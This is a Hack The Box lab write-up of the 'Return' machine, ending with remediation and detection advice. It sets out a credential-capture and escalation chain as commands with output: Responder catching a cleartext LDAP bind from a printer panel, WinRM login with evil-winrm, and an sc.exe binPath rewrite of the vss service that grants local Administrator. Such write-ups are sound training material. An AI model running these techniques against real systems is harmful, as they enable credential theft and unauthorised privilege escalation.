---
title: "Return — LDAP Credential Capture via Printer Admin Panel"
description: "A printer admin panel's LDAP configuration is redirected to capture service credentials, then Server Operators escalation reaches Administrator."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ldap
  - credential-capture
  - server-operators
objective: "Escalate from a misconfigured printer admin panel to local Administrator by capturing cleartext LDAP service credentials and abusing Server Operators rights."
tools:
  - rustscan
  - Responder
  - NetExec
  - evil-winrm
  - sc.exe
skill: "Credential capture through a misconfigured appliance LDAP configuration and service-based privilege escalation"
outcome: "Cleartext LDAP service-account capture and local Administrator access via a reconfigured service binary path"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Domain-joined Windows Server (Active Directory) |
| Starting position | Unauthenticated network access |
| Objective | Escalate from a misconfigured printer admin panel to local Administrator |
| Outcome | Cleartext LDAP service-account capture; local Administrator via a reconfigured service |

## Printer panel LDAP capture to admin

Return is an Easy-rated Hack The Box Windows Active Directory lab in which a misconfigured printer administration panel leaks a service account's credentials through a cleartext LDAP bind, and that account's `Server Operators` membership is then abused for local Administrator access. The chain uses only legitimate functionality and exploits no CVE. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). Where captured output is absent, this case study labels outcomes as documented results.

**Attack path:** **Printer admin panel → LDAP server address redirected to a credential listener → cleartext service credential captured → WinRM access → Server Operators service reconfiguration → local Administrator**

## Printer admin panel on a domain-joined server

- **Target:** domain-joined Windows Server (hostname `<TARGET_HOSTNAME>`) in the `<TARGET_DOMAIN>` domain.
- **Exposed services:** DNS (53), HTTP/IIS 10.0 (80), Kerberos (88), LDAP (389), SMB (445), and WinRM (5985).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** obtain user access and escalate to local Administrator through the printer admin panel's attack surface and the domain's group configuration.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: printer panel bind capture to service reconfiguration

### 1. Service Enumeration

Observation: a full TCP scan with version detection and default scripts exposes six services on a domain-joined host.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

Truncated scan output:

```text
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: <TARGET_DOMAIN>)
445/tcp  open  microsoft-ds
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Significance: DNS, Kerberos, LDAP, and SMB together identify an Active Directory host, and WinRM on 5985 accepts PowerShell over HTTP, so any valid domain credential with remote-access rights yields a shell.

Result: the scan identifies a domain-joined Windows Server exposing LDAP, Kerberos, HTTP, and WinRM.

### 2. LDAP Credential Capture via the Printer Panel

Observation: the HTTP service hosts an "HTB Printer Admin Panel" whose Settings page exposes LDAP connection fields (server address, port, username, and password) and attempts an LDAP bind whenever the settings are saved. Pointing the server address at an attacker-controlled listener redirects that bind to the attacker.

Action: start a credential listener on the attacker interface, then set the panel's LDAP server address to the attacker and save.

```bash
sudo responder -I <ATTACK_INTERFACE>
```

The listener captures the cleartext bind after the settings are saved:

```text
[LDAP] Cleartext Client   : <TARGET_IP>
[LDAP] Cleartext Username : <TARGET_DOMAIN>\<SERVICE_ACCOUNT>
[LDAP] Cleartext Password : <SERVICE_ACCOUNT_PASSWORD>
```

Significance: LDAP carries bind credentials in cleartext unless LDAPS or channel binding/token protection is enforced. Because the panel stores and reuses the credential, the next save discloses it directly to the listener.

Result: a cleartext LDAP bind captures the service account's credential.

### 3. Initial Access via WinRM

Observation: the captured credential authenticates over WinRM.

Action: validate the credential, then open an interactive session.

```bash
nxc winrm <TARGET_DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>'
```

```text
[+] <TARGET_DOMAIN>\<SERVICE_ACCOUNT>:<SERVICE_ACCOUNT_PASSWORD> (Pwn3d!)
```

```bash
evil-winrm -i <TARGET_DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>'
```

Significance: the `(Pwn3d!)` marker confirms the account can authenticate and execute over WinRM. The same credential recovered from the LDAP bind opens the interactive session, and no other secret is reused.

Result: an interactive WinRM session is established as the service account.

### 4. Privilege Escalation via Server Operators

Observation: the service account is a member of the built-in `Server Operators` group, which can stop, start, and reconfigure services on the host.

Action: I checked the account's group membership, repointed an existing service's binary path to add the account to local Administrators, restarted the service, and reconnected to obtain a fresh token.

```powershell
whoami /groups
```

```text
BUILTIN\Server Operators
```

```powershell
sc.exe config vss binPath= "cmd.exe /c net localgroup Administrators <SERVICE_ACCOUNT> /add"
sc.exe stop vss
sc.exe start vss
```

After the service runs the new binary path, reconnecting over WinRM shows the updated membership:

```powershell
net localgroup Administrators
```

```text
Members
-------------------------------------------------------------------------------
<LOCAL_ADMINISTRATOR>
Domain Admins
Enterprise Admins
<SERVICE_ACCOUNT>
```

Significance: `Server Operators` can rewrite service definitions, so changing the `vss` binary path turns service control into code execution as SYSTEM and adds the account to local Administrators. WinRM tokens capture group membership at session creation, so a new session is required to reflect the new rights.

Result: the service account appears in local Administrators, which confirms Administrator-level access on the host.

## Two decisions: repoint vss and reconnect WinRM

| Decision | Rationale |
|---|---|
| Repointed the existing `vss` service for the escalation | `Server Operators` can reconfigure existing service definitions, so no new service was needed. |
| Reconnected over WinRM after the group change | Existing tokens reflect the group membership captured when the session was created. |

## Outcome: cleartext LDAP capture and local Administrator

The host reached local Administrator access without a CVE: every step used legitimate Active Directory and Windows service functionality. The limiting factors were cleartext LDAP transport, reusable credentials stored by the printer panel, and excessive `Server Operators` membership on the service account. HTTP exposure was limited to reaching the administrative panel. The LDAP server address was redirected from the panel's settings; I could not verify that change from retained output, only from the authentication it produced.

## Recommendations: LDAP transport, service-account privilege, and panel secrets

The abuse chain itself was exercised. The actions below are recommendations that were not validated.

1. **Cleartext LDAP transport.** The printer panel stored and reused an LDAP bind credential, and the bind travels unencrypted to a configurable server address, so redirecting that address disclosed the credential. *Recommendation:* enforce LDAPS and enable LDAP server signing and channel binding, and require authentication on appliance management interfaces. *Detection:* monitor LDAP binds from service hosts to unexpected destinations.
2. **Excessive service-account privilege.** The service account held `Server Operators` membership, which let it rewrite a service binary path and obtain SYSTEM-level execution to join local Administrators. *Recommendation:* apply least privilege and remove interactive service accounts from privileged built-in groups. *Detection:* audit membership of `Server Operators` and other privileged groups, and monitor service `binPath` changes.
3. **Credential-bearing appliance panels.** The admin panel was reachable and stored a reusable LDAP credential. *Recommendation:* network-restrict management interfaces, rotate any credential a panel caches, and keep credential material out of web-facing configuration.

## References

- [Hack The Box — Return](https://app.hackthebox.com/machines/Return) (retired machine)
- [Responder](https://github.com/lgandx/Responder) (rogue authentication server, including LDAP capture)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (WinRM authentication and remote execution checks)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (WinRM interactive shell)
- [RustScan](https://github.com/bee-san/RustScan) (port scanner driving Nmap scripts and version detection)
- [Active Directory Security Groups (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)
- [Domain controller: LDAP server signing requirements (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/domain-controller-ldap-server-signing-requirements)
- [Domain controller: LDAP server channel binding token requirements (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/domain-controller-ldap-server-channel-binding-token-requirements)
- [Enable LDAP over SSL (LDAPS) (Microsoft Learn)](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-ldap-over-ssl-3rd-certification-authority)
- [sc.exe config (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)
- [Net localgroup (Microsoft Learn)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc725622(v=ws.11))
